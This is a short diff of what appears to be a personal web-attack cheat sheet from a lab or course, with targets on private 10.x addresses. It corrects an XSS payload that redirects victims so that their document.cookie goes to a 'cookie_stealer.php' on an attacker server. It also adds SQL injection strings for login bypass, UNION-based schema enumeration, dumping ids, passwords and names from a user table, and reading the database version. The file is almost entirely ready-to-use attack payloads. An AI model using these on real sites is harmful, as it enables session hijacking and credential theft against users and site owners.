@@ -231,8 +231,8 @@ fclose($steal);
 ?>
 
 
-<script>document.location=http://<serverip>/uploads/cookie_stealer.php?username="+document.cookie;</script>
-<script>document.location=http://<10.50.37.95>/uploads/cookie_stealer.php?username="+document.cookie;</script>
+<script>document.location="http://<serverip>/uploads/cookie_stealer.php?username="+document.cookie;</script>
+<script>document.location="http://10.100.28.40/uploads/cookie_stealer.php?username="+document.cookie;</script>
 
 
 
@@ -443,9 +443,11 @@ username=user&passwd=user%27+or+%271%3D1 ( with web search bar)
 ---------------------------------------------------
 http://10.50.42.112/Union.html
 POST
+
 Audi' OR '1=1
 
 GET
+
 http://10.50.42.112/uniondemo.php?Selection=2 or 1=1
 http://10.50.42.112/uniondemo.php?Selection=2 UNION select 1,2,3 #
 
@@ -461,3 +463,6 @@ Selection=2 UNION select table_schema,table_name,Column_name,4,5,6 from informat
  TO QUERY 
  
 http://10.50.42.112/uniondemo.php?Selection=2 UNION select id,pass,name from session.user
+
+
+UNION SELECT 1,2,@@version --- to get the version
